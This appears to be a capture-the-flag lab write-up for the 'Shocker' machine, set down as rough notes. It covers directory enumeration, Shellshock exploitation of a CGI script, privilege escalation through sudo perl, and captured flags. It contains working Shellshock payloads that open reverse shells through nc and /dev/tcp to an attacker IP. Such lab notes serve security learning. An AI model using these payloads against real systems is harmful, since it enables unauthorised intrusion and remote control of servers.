# 10.10.10.56 - shocker

## port 2222 open
## port 80 open
- shellshock --> looking for cgi-bin dir
- gobuster keeps timing out the connection - cant brute force directory
### /cgi-bin/ --> need to have the backslash at the end of the uri
- going to try to gobuster the directory for files --> use smaller file 
- Linux box so look for html, php, txt, sh
```
 gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt --delay 1000ms -x .sh,.php,.html,.txt -t 2 -o cgi-bin-dir-common.gobust
```
- The box keeps timing out, frustrating!!!
- Looked at a walkthrough for the file i'm supposed to look for
	- /cgi-bin/user.sh  

#### nc shell shock attempt
```
curl -H "User-Agent: () {:;};echo /bin/nc -e /bin/bash 10.10.14.19 1985" http://10.10.10.56/cgi-bin/user.sh

Content-Type: text/plain

Just an uptime test script

 04:46:14 up  8:13,  0 users,  load average: 0.00, 0.00, 0.00
```
# 


- Executing the example found on the OWASP website isnt fruitful
- Attempting to use pentest monkey bash reverse shell instead of using nc

```
curl -H 'User-Agent: () { :; };/bin/bash -i >& /dev/tcp/10.10.14.19/1985 0>&1' http://10.10.10.56/cgi-bin/user.sh
```

- This command gives us the low priv shell
	* single quotes and spaces matter --> attempting to get nc to work

#### Internal server error from attempting nc shell shock

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>500 Internal Server Error</title>
</head><body>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error or
misconfiguration and was unable to complete
your request.</p>
<p>Please contact the server administrator at 
 webmaster@localhost to inform them of the time this error occurred,
 and the actions you performed just before this error.</p>
<p>More information about this error may be available
in the server error log.</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.10.56 Port 80</address>
</body></html>

## User Shelly - User.txt
```
shelly@Shocker:/home/shelly$ cat u
cat user.txt 
2ec24e11320026d1e70ff3e16695b233
```
- wget LinEnum.sh onto the box and run it

## sudo -l 
### always look for low hanging fruit first
```
User shelly may run the following commands on Shocker:                                                                                                                    
    (root) NOPASSWD: /usr/bin/perl  
```
- no need to run LinEnum.sh although its good practice to get it on the box and read through it for possible vulns
	* sudo -l takes seconds rather than minutes and can be run immediately 
	* time to gtfo 
## Root.txt
```
pwd
/root
cat root.txt
52c2715605d70c7619030560dc1ca467
```

